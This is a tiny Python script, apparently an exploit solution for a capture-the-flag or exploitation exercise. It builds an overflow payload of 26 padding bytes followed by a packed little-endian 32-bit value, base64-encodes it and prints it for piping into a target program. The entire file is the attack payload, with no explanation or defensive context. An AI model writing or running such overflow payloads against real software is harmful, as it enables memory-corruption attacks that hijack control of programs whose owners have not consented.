
import sys
import struct
import base64

buf = b'iiiiiiiiiiiiiiiiiiiiiiiiii'
buf += struct.pack('<I', 372767892)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
